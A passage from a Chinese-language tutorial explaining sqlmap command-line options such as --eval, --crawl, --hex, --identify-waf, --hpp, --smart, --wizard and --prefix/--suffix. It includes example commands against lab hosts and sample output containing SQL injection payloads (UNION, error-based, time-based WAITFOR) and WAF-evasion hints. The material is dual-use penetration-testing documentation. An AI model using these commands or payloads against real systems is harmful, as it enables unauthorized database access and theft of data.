title="关掉URL参数值编码"></a>关掉URL参数值编码</h4><p>参数：–skip-urlencode</p><p>根据参数位置，他的值默认将会被URL编码，但是有些时候后端的web服务器不遵守RFC标准，只接受不经过URL编码的值，这时候就需要用–skip-urlencode参数。</p><h4 id="每次请求时候执行自定义的python代码"><a href="#每次请求时候执行自定义的python代码" class="headerlink" title="每次请求时候执行自定义的python代码"></a>每次请求时候执行自定义的python代码</h4><p>参数：–eval</p><p>在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求。</p><p>例子：</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib;hash=hashlib.md5(id).hexdigest()"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的请求就是每次请求时根据id参数值，做一次md5后作为hash参数的值。</p><h3 id="常规参数"><a href="#常规参数" class="headerlink" title="常规参数"></a>常规参数</h3><h4 id="从sqlite中读取session"><a href="#从sqlite中读取session" class="headerlink" title="从sqlite中读取session"></a>从sqlite中读取session</h4><p>参数：-s</p><p>sqlmap对每一个目标都会在output路径下自动生成一个SQLite文件，如果用户想指定读取的文件路径，就可以用这个参数。</p><h4 id="保存HTTP-S-日志"><a href="#保存HTTP-S-日志" class="headerlink" title="保存HTTP(S)日志"></a>保存HTTP(S)日志</h4><p>参数：-t</p><p>这个参数需要跟一个文本文件，sqlmap会把HTTP(S)请求与响应的日志保存到那里。</p><h4 id="非交互模式"><a href="#非交互模式" class="headerlink" title="非交互模式"></a>非交互模式</h4><p>参数：–batch</p><p>用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。</p><h4 id="强制使用字符编码"><a href="#强制使用字符编码" class="headerlink" title="强制使用字符编码"></a>强制使用字符编码</h4><p>参数：–charset</p><p>不使用sqlmap自动识别的（如HTTP头中的Content-Type）字符编码，强制指定字符编码如：</p><pre class="line-numbers language-none"><code class="language-none">--charset=GBK<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="爬行网站URL"><a href="#爬行网站URL" class="headerlink" title="爬行网站URL"></a>爬行网站URL</h4><p>参数：–crawl</p><p>sqlmap可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。</p><p>例子：</p><pre class="line-numbers language-none"><code class="language-none">$ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/" --batch --crawl=3[...][xx:xx:53] [INFO] starting crawler[xx:xx:53] [INFO] searching for links with depth 1[xx:xx:53] [WARNING] running in a single-thread mode. This could take a while[xx:xx:53] [INFO] searching for links with depth 2[xx:xx:54] [INFO] heuristics detected web page charset 'ascii'[xx:xx:00] [INFO] 42/56 links visited (75%)[...]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="规定输出到CSV中的分隔符"><a href="#规定输出到CSV中的分隔符" class="headerlink" title="规定输出到CSV中的分隔符"></a>规定输出到CSV中的分隔符</h4><p>参数：–csv-del</p><p>当dump保存为CSV格式时（–dump-format=CSV），需要一个分隔符默认是逗号，用户也可以改为别的 如：</p><pre class="line-numbers language-none"><code class="language-none">--csv-del=";"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="DBMS身份验证"><a href="#DBMS身份验证" class="headerlink" title="DBMS身份验证"></a>DBMS身份验证</h4><p>参数：–dbms-cred</p><p>某些时候当前用户的权限不够，做某些操作会失败，如果知道高权限用户的密码，可以使用此参数，有的数据库有专门的运行机制，可以切换用户如Microsoft SQL Server的OPENROWSET函数</p><h4 id="定义dump数据的格式"><a href="#定义dump数据的格式" class="headerlink" title="定义dump数据的格式"></a>定义dump数据的格式</h4><p>参数：–dump-format</p><p>输出的格式可定义为：CSV，HTML，SQLITE</p><h4 id="预估完成时间"><a href="#预估完成时间" class="headerlink" title="预估完成时间"></a>预估完成时间</h4><p>参数：–eta</p><p>可以计算注入数据的剩余时间。</p><p>例如Oracle的布尔型盲注：</p><pre class="line-numbers language-none"><code class="language-none">$ python sqlmap.py -u "http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1" -b --eta[...][hh:mm:01] [INFO] the back-end DBMS is Oracle[hh:mm:01] [INFO] fetching banner[hh:mm:01] [INFO] retrieving the length of query output[hh:mm:01] [INFO] retrieved: 6417% [========&gt;                                          ] 11/64  ETA 00:19 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后：</p><pre class="line-numbers language-none"><code class="language-none">100% [===================================================] 64/64[hh:mm:53] [INFO] retrieved: Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prodweb application technology: PHP 5.2.6, Apache 2.2.9back-end DBMS: Oraclebanner:    'Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>sqlmap先输出长度，预计完成时间，显示百分比，输出字符</p><h4 id="刷新session文件"><a href="#刷新session文件" class="headerlink" title="刷新session文件"></a>刷新session文件</h4><p>参数：–flush-session</p><p>如果不想用之前缓存这个目标的session文件，可以使用这个参数。 会清空之前的session，重新测试该目标。</p><h4 id="自动获取form表单测试"><a href="#自动获取form表单测试" class="headerlink" title="自动获取form表单测试"></a>自动获取form表单测试</h4><p>参数：–forms</p><p>如果你想对一个页面的form表单中的参数测试，可以使用-r参数读取请求文件，或者通过–data参数测试。 但是当使用–forms参数时，sqlmap会自动从-u中的url获取页面中的表单进行测试。</p><h4 id="忽略在会话文件中存储的查询结果"><a href="#忽略在会话文件中存储的查询结果" class="headerlink" title="忽略在会话文件中存储的查询结果"></a>忽略在会话文件中存储的查询结果</h4><p>参数：–fresh-queries</p><p>忽略session文件保存的查询，重新查询。</p><h4 id="使用DBMS的hex函数"><a href="#使用DBMS的hex函数" class="headerlink" title="使用DBMS的hex函数"></a>使用DBMS的hex函数</h4><p>参数：–hex</p><p>有时候字符编码的问题，可能导致数据丢失，可以使用hex函数来避免：</p><p>针对PostgreSQL例子：</p><pre class="line-numbers language-none"><code class="language-none">$ python sqlmap.py -u "http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1" --banner --hex -v 3 --parse-errors[...][xx:xx:14] [INFO] fetching banner[xx:xx:14] [PAYLOAD] 1 AND 5849=CAST((CHR(58)||CHR(118)||CHR(116)||CHR(106)||CHR(58))||(ENCODE(CONVERT_TO((COALESCE(CAST(VERSION() AS CHARACTER(10000)),(CHR(32)))),(CHR(85)||CHR(84)||CHR(70)||CHR(56))),(CHR(72)||CHR(69)||CHR(88))))::text||(CHR(58)||CHR(110)||CHR(120)||CHR(98)||CHR(58)) AS NUMERIC)[xx:xx:15] [INFO] parsed error message: 'pg_query() [&lt;a href='function.pg-query'&gt;function.pg-query&lt;/a&gt;]: Query failed: ERROR:  invalid input syntax for type numeric: ":vtj:506f737467726553514c20382e332e39206f6e20693438362d70632d6c696e75782d676e752c20636f6d70696c656420627920474343206763632d342e332e7265616c202844656269616e2032e332e322d312e312920342e332e32:nxb:" in &lt;b&gt;/var/www/sqlmap/libs/pgsql.inc.php&lt;/b&gt; on line &lt;b&gt;35&lt;/b&gt;'[xx:xx:15] [INFO] retrieved: PostgreSQL 8.3.9 on i486-pc-linux-gnu, compiled byGCC gcc-4.3.real (Debian 4.3.2-1.1) 4.3.2[...]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="自定义输出的路径"><a href="#自定义输出的路径" class="headerlink" title="自定义输出的路径"></a>自定义输出的路径</h4><p>参数：–output-dir</p><p>sqlmap默认把session文件跟结果文件保存在output文件夹下，用此参数可自定义输出路径 例如：–output-dir=/tmp</p><h4 id="从响应中获取DBMS的错误信息"><a href="#从响应中获取DBMS的错误信息" class="headerlink" title="从响应中获取DBMS的错误信息"></a>从响应中获取DBMS的错误信息</h4><p>参数：–parse-errors</p><p>有时目标没有关闭DBMS的报错，当数据库语句错误时，会输出错误语句，用词参数可以会显出错误信息。</p><pre class="line-numbers language-none"><code class="language-none">$ python sqlmap.py -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1" --parse-errors[...][11:12:17] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test[11:12:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 10 is out of range of the number of items in the select list.&lt;b&gt;/sqlmap/mssql/iis/get_int.asp, line 27&lt;/b&gt;'[11:12:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 6 is out of range of the number of items in the select list.&lt;b&gt;/sqlmap/mssql/iis/get_int.asp, line 27&lt;/b&gt;'[11:12:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 4 is out of range of the number of items in the select list.&lt;b&gt;/sqlmap/mssql/iis/get_int.asp, line 27&lt;/b&gt;'[11:12:17] [INFO] target URL appears to have 3 columns in query[...]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="其他的一些参数"><a href="#其他的一些参数" class="headerlink" title="其他的一些参数"></a>其他的一些参数</h3><h4 id="使用参数缩写"><a href="#使用参数缩写" class="headerlink" title="使用参数缩写"></a>使用参数缩写</h4><p>参数：-z</p><p>有使用参数太长太复杂，可以使用缩写模式。 例如：</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py --batch --random-agent --ignore-proxy --technique=BEU -u "www.target.com/vuln.php?id=1"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以写成：</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -z "bat,randoma,ign,tec=BEU" -u "www.target.com/vuln.php?id=1"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>还有：</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py --ignore-proxy --flush-session --technique=U --dump -D testdb -T users -u "www.target.com/vuln.php?id=1"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以写成：</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -z "ign,flu,bat,tec=U,dump,D=testdb,T=users" -u "www.target.com/vuln.php?id=1"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="成功SQL注入时警告"><a href="#成功SQL注入时警告" class="headerlink" title="成功SQL注入时警告"></a>成功SQL注入时警告</h4><p>参数：–alert</p><h4 id="设定会发的答案"><a href="#设定会发的答案" class="headerlink" title="设定会发的答案"></a>设定会发的答案</h4><p>参数：–answers</p><p>当希望sqlmap提出输入时，自动输入自己想要的答案可以使用此参数： 例子：</p><pre class="line-numbers language-none"><code class="language-none">$ python sqlmap.py -u "http://192.168.22.128/sqlmap/mysql/get_int.php?id=1"--technique=E --answers="extending=N" --batch[...][xx:xx:56] [INFO] testing for SQL injection on GET parameter 'id'heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y[xx:xx:56] [INFO] do you want to include all tests for 'MySQL' extending provided level (1) and risk (1)? [Y/n] N[...] <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="发现SQL注入时发出蜂鸣声"><a href="#发现SQL注入时发出蜂鸣声" class="headerlink" title="发现SQL注入时发出蜂鸣声"></a>发现SQL注入时发出蜂鸣声</h4><p>参数：–beep</p><p>发现sql注入时，发出蜂鸣声。</p><h4 id="启发式检测WAF-IPS-IDS保护"><a href="#启发式检测WAF-IPS-IDS保护" class="headerlink" title="启发式检测WAF/IPS/IDS保护"></a>启发式检测WAF/IPS/IDS保护</h4><p>参数：–check-waf</p><p>WAF/IPS/IDS保护可能会对sqlmap造成很大的困扰，如果怀疑目标有此防护的话，可以使用此参数来测试。 sqlmap将会使用一个不存在的参数来注入测试</p><p>例如：</p><pre class="line-numbers language-none"><code class="language-none">&amp;foobar=AND 1=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables WHERE 2&gt;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果有保护的话可能返回结果会不同。</p><h4 id="清理sqlmap的UDF-s-和表"><a href="#清理sqlmap的UDF-s-和表" class="headerlink" title="清理sqlmap的UDF(s)和表"></a>清理sqlmap的UDF(s)和表</h4><p>参数：–cleanup</p><p>清除sqlmap注入时产生的udf与表。</p><h4 id="禁用彩色输出"><a href="#禁用彩色输出" class="headerlink" title="禁用彩色输出"></a>禁用彩色输出</h4><p>参数：–desable-coloring</p><p>sqlmap默认彩色输出，可以使用此参数，禁掉彩色输出。</p><h4 id="使用指定的Google结果页面"><a href="#使用指定的Google结果页面" class="headerlink" title="使用指定的Google结果页面"></a>使用指定的Google结果页面</h4><p>参数：–gpage</p><p>默认sqlmap使用前100个URL地址作为注入测试，结合此选项，可以指定页面的URL测试。</p><h4 id="使用HTTP参数污染"><a href="#使用HTTP参数污染" class="headerlink" title="使用HTTP参数污染"></a>使用HTTP参数污染</h4><p>参数：**–hpp**</p><p>HTTP参数污染可能会绕过WAF/IPS/IDS保护机制，这个对ASP/IIS与ASP.NET/IIS平台很有效。</p><h4 id="测试WAF-IPS-IDS保护"><a href="#测试WAF-IPS-IDS保护" class="headerlink" title="测试WAF/IPS/IDS保护"></a>测试WAF/IPS/IDS保护</h4><p>参数：–identify-waf</p><p>sqlmap可以尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。目前大约支持30种产品的识别。</p><p>例如对一个受到ModSecurity WAF保护的MySQL例子：</p><pre class="line-numbers language-none"><code class="language-none">$ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" --identify-waf -v 3[...][xx:xx:23] [INFO] testing connection to the target URL[xx:xx:23] [INFO] heuristics detected web page charset 'ascii'[xx:xx:23] [INFO] using WAF scripts to detect backend WAF/IPS/IDS protection[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'USP Secure Entry Server (United Security Providers)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'BinarySEC Web Application Firewall (BinarySEC)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'NetContinuum Web Application Firewall (NetContinuum/Barracuda Networks)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Hyperguard Web Application Firewall (art of defence Inc.)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Cisco ACE XML Gateway (Cisco Systems)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'TrafficShield (F5 Networks)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Teros/Citrix Application Firewall Enterprise (Teros/Citrix Systems)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'KONA Security Solutions (Akamai Technologies)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Incapsula Web Application Firewall (Incapsula/Imperva)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'CloudFlare Web Application Firewall (CloudFlare)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Barracuda Web Application Firewall (Barracuda Networks)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'webApp.secure (webScurity)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Proventia Web Application Security (IBM)'[xx:xx:23] [DEBUG] declared web page charset 'iso-8859-1'[xx:xx:23] [DEBUG] page not found (404)[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'KS-WAF (Knownsec)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'NetScaler (Citrix Systems)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Jiasule Web Application Firewall (Jiasule)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'WebKnight Application Firewall (AQTRONIX)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'AppWall (Radware)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'ModSecurity: Open Source Web Application Firewall (Trustwave)'[xx:xx:23] [CRITICAL] WAF/IDS/IPS identified 'ModSecurity: Open Source Web Application Firewall (Trustwave)'. Please consider usage of tamper scripts (option '--tamper')[...]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="模仿智能手机"><a href="#模仿智能手机" class="headerlink" title="模仿智能手机"></a>模仿智能手机</h4><p>参数：–mobile</p><p>有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。</p><p>例如：</p><pre class="line-numbers language-none"><code class="language-none">$ python sqlmap.py -u "http://www.target.com/vuln.php?id=1" --mobile[...]which smartphone do you want sqlmap to imitate through HTTP User-Agent header?[1] Apple iPhone 4s (default)[2] BlackBerry 9900[3] Google Nexus 7[4] HP iPAQ 6365[5] HTC Sensation[6] Nokia N97[7] Samsung Galaxy S&gt; 1[...]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="安全的删除output目录的文件"><a href="#安全的删除output目录的文件" class="headerlink" title="安全的删除output目录的文件"></a>安全的删除output目录的文件</h4><p>参数：–purge-output</p><p>有时需要删除结果文件，而不被恢复，可以使用此参数，原有文件将会被随机的一些文件覆盖。</p><p>例如：</p><pre class="line-numbers language-none"><code class="language-none">$ python sqlmap.py --purge-output -v 3[...][xx:xx:55] [INFO] purging content of directory '/home/user/sqlmap/output'...[xx:xx:55] [DEBUG] changing file attributes[xx:xx:55] [DEBUG] writing random data to files[xx:xx:55] [DEBUG] truncating files[xx:xx:55] [DEBUG] renaming filenames to random values[xx:xx:55] [DEBUG] renaming directory names to random values[xx:xx:55] [DEBUG] deleting the whole directory tree[...]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="启发式判断注入"><a href="#启发式判断注入" class="headerlink" title="启发式判断注入"></a>启发式判断注入</h4><p>参数：–smart</p><p>有时对目标非常多的URL进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入，可以使用此参数。</p><p>例子：</p><pre class="line-numbers language-none"><code class="language-none">$ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&amp;user=foo&amp;id=1" --batch --smart[...][xx:xx:14] [INFO] testing if GET parameter 'ca' is dynamic[xx:xx:14] [WARNING] GET parameter 'ca' does not appear dynamic[xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'ca' might not be injectable[xx:xx:14] [INFO] skipping GET parameter 'ca'[xx:xx:14] [INFO] testing if GET parameter 'user' is dynamic[xx:xx:14] [WARNING] GET parameter 'user' does not appear dynamic[xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'user' might not be injectable[xx:xx:14] [INFO] skipping GET parameter 'user'[xx:xx:14] [INFO] testing if GET parameter 'id' is dynamic[xx:xx:14] [INFO] confirming that GET parameter 'id' is dynamic[xx:xx:14] [INFO] GET parameter 'id' is dynamic[xx:xx:14] [WARNING] reflective value(s) found and filtering out[xx:xx:14] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')[xx:xx:14] [INFO] testing for SQL injection on GET parameter 'id'heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Ydo you want to include all tests for 'MySQL' extending provided level (1) and risk (1)? [Y/n] Y[xx:xx:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[xx:xx:14] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectable [xx:xx:14] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause'[xx:xx:14] [INFO] GET parameter 'id' is 'MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause' injectable [xx:xx:14] [INFO] testing 'MySQL inline queries'[xx:xx:14] [INFO] testing 'MySQL &gt; 5.0.11 stacked queries'[xx:xx:14] [INFO] testing 'MySQL &lt; 5.0.12 stacked queries (heavy query)'[xx:xx:14] [INFO] testing 'MySQL &gt; 5.0.11 AND time-based blind'[xx:xx:24] [INFO] GET parameter 'id' is 'MySQL &gt; 5.0.11 AND time-based blind' injectable [xx:xx:24] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'[xx:xx:24] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other potential injection technique found[xx:xx:24] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test[xx:xx:24] [INFO] target URL appears to have 3 columns in query[xx:xx:24] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable[...] <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="初级用户向导参数"><a href="#初级用户向导参数" class="headerlink" title="初级用户向导参数"></a>初级用户向导参数</h4><p>参数：–wizard </p><p>面向初级用户的参数，可以一步一步教你如何输入针对目标注入。</p><pre class="line-numbers language-none"><code class="language-none">$ python sqlmap.py --wizard    sqlmap/1.0-dev-2defc30 - automatic SQL injection and database takeover toolhttp://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 11:25:26Please enter full target URL (-u): http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1POST data (--data) [Enter for None]: Injection difficulty (--level/--risk). Please choose:[1] Normal (default)[2] Medium[3] Hard&gt; 1Enumeration (--banner/--current-user/etc). Please choose:[1] Basic (default)[2] Smart[3] All&gt; 1sqlmap is running, please wait..heuristic (parsing) test showed that the back-end DBMS could be 'Microsoft SQL Server'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Ydo you want to include all tests for 'Microsoft SQL Server' extending provided level (1) and risk (1)? [Y/n] YGET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Nsqlmap identified the following injection points with a total of 25 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1 AND 2986=2986    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: id=1 AND 4847=CONVERT(INT,(CHAR(58) CHAR(118) CHAR(114) CHAR(100) CHAR(58) (SELECT (CASE WHEN (4847=4847) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(111) CHAR(109) CHAR(113) CHAR(58)))    Type: UNION query    Title: Generic UNION query (NULL) - 3 columns    Payload: id=1 UNION ALL SELECT NULL,NULL,CHAR(58) CHAR(118) CHAR(114) CHAR(100) CHAR(58) CHAR(70) CHAR(79) CHAR(118) CHAR(106) CHAR(87) CHAR(101) CHAR(119) CHAR(115) CHAR(114) CHAR(77) CHAR(58) CHAR(111) CHAR(109) CHAR(113) CHAR(58)--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: id=1; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: id=1 WAITFOR DELAY '0:0:5'--    Type: inline query    Title: Microsoft SQL Server/Sybase inline queries    Payload: id=(SELECT CHAR(58) CHAR(118) CHAR(114) CHAR(100) CHAR(58) (SELECT (CASE WHEN (6382=6382) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(111) CHAR(109) CHAR(113) CHAR(58))---web server operating system: Windows XPweb application technology: ASP, Microsoft IIS 5.1back-end DBMS operating system: Windows XP Service Pack 2back-end DBMS: Microsoft SQL Server 2005banner:---Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86)     Oct 14 2005 00:33:37     Copyright (c) 1988-2005 Microsoft Corporation    Express Edition on Windows NT 5.1 (Build 2600: Service Pack 2)---current user:    'sa'current database:    'testdb'current user is DBA:    True[*] shutting down at 11:25:52<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><h4 id="测试是否是注入"><a href="#测试是否是注入" class="headerlink" title="测试是否是注入"></a>测试是否是注入</h4><p>参数：–technique</p><p>这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。</p><p>支持的探测方式如下：</p><pre class="line-numbers language-none"><code class="language-none">B: Boolean-based blind SQL injection（布尔型注入）E: Error-based SQL injection（报错型注入）U: UNION query SQL injection（可联合查询注入）S: Stacked queries SQL injection（可多语句查询注入）T: Time-based blind SQL injection（基于时间延迟注入）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="设定延迟注入的时间"><a href="#设定延迟注入的时间" class="headerlink" title="设定延迟注入的时间"></a>设定延迟注入的时间</h4><p>参数：–time-sec</p><p>当使用继续时间的盲注时，时刻使用–time-sec参数设定延时时间，默认是5秒。</p><h4 id="测试参数"><a href="#测试参数" class="headerlink" title="测试参数"></a>测试参数</h4><p>参数：-p,–skip</p><p>sqlmap默认测试所有的GET和POST参数，当–level的值大于等于2的时候也会测试HTTP  Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP  Referer头的值。但是你可以手动用-p参数设置想要测试的参数。例如： -p “id,user-anget”</p><p>当你使用–level的值很大但是有个别参数不想测试的时候可以使用–skip参数。</p><p>例如：–skip=”user-angent.referer”</p><p>在有些时候web服务器使用了URL重写，导致无法直接使用sqlmap测试参数，可以在想测试的参数后面加*</p><p>例如：</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://targeturl/param1/value1*/param2/value2/"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sqlmap将会测试value1的位置是否可注入。</p><h4 id="指定数据库"><a href="#指定数据库" class="headerlink" title="指定数据库"></a>指定数据库</h4><p>参数：–dbms</p><p>默认情况系sqlmap会自动的探测web应用后端的数据库是什么，sqlmap支持的数据库有：</p><pre class="line-numbers language-none"><code class="language-none">MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、SQLite、Firebird、Sybase、SAP MaxDB、DB2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="指定数据库服务器系统"><a href="#指定数据库服务器系统" class="headerlink" title="指定数据库服务器系统"></a>指定数据库服务器系统</h4><p>参数：–os</p><p>默认情况下sqlmap会自动的探测数据库服务器系统，支持的系统有：Linux、Windows。</p><h4 id="指定无效的大数字"><a href="#指定无效的大数字" class="headerlink" title="指定无效的大数字"></a>指定无效的大数字</h4><p>参数：–invalid-bignum</p><p>当你想指定一个报错的数值时，可以使用这个参数，例如默认情况系id=13，sqlmap会变成id=-13来报错，你可以指定比如id=9999999来报错。</p><h4 id="只定无效的逻辑"><a href="#只定无效的逻辑" class="headerlink" title="只定无效的逻辑"></a>只定无效的逻辑</h4><p>参数：–invalid-logical</p><p>原因同上，可以指定id=13把原来的id=-13的报错改成id=13 AND 18=19。</p><h4 id="注入payload"><a href="#注入payload" class="headerlink" title="注入payload"></a>注入payload</h4><p>参数：–prefix,–suffix</p><p>在有些环境中，需要在注入的payload的前面或者后面加一些字符，来保证payload的正常执行。</p><p>例如，代码中是这样调用数据库的：</p><pre class="line-numbers language-none"><code class="language-none">$query = "SELECT * FROM users WHERE id=(’" . $_GET[’id’] . "’) LIMIT 0, 1";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这时你就需要–prefix和–suffix参数了：</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" -p id --prefix "’)" --suffix "AND (’abc’=’abc"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样执行的SQL语句变成：</p><pre class="line-numbers language-none"><code class="language-none">$query = "SELECT * FROM users WHERE id=(’1’) &lt;PAYLOAD&gt; AND (’abc’=’abc’) LIMIT 0, 1";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="修改注入的数据"><a href="#修改注入的数据" class="headerlink" 